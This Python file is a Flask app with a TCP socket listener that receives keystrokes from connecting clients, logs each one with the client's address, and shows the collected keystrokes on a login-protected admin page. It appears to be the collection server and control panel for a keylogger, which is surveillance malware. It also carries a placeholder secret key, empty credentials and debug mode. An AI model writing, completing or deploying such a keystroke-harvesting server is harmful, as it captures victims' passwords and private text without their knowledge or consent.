import socket
import threading
from flask import Flask, render_template, request, redirect, url_for, session
from pynput.keyboard import Key, Listener

app = Flask(__name__)
app.secret_key = 'some_secret_key'  # You can change this to something more secure

# Define the username and password for authentication
USERNAME = ''
PASSWORD = ''

keystrokes = []  

IP = 'localhost'
PORT = 8081

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.bind((IP, PORT))

s.listen()
print(f"Listening on {IP}:{PORT}...")

def handle_client(conn, addr):
    print(f"Connection from {addr[0]}:{addr[1]}")
    
    while True:
        data = conn.recv(1024) 
        if not data:
            break
        keystrokes.append(data.decode())  # Store the keystroke
        print(f"Keystroke from {addr[0]}:{addr[1]} - {data.decode()}")
    
    conn.close()
    print(f"Connection from {addr[0]}:{addr[1]} closed")

# Function to authenticate users
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if username == USERNAME and password == PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('home_page'))
        else:
            return "Invalid credentials. Try again."
    
    return render_template('login.html')

# Protect home_page route with authentication
@app.route('/home_page')
def home_page():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    return render_template('home_page.html')

@app.route('/admin')
def admin():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    return render_template('admin.html', keystrokes=keystrokes)

def start_socket_server():
    while True:
        conn, addr = s.accept()
        client_thread = threading.Thread(target=handle_client, args=(conn, addr))
        client_thread.start()

if __name__ == "__main__":
    # Start the Flask app and socket server in parallel
    threading.Thread(target=start_socket_server, daemon=True).start()
    app.run(debug=True, use_reloader=False)
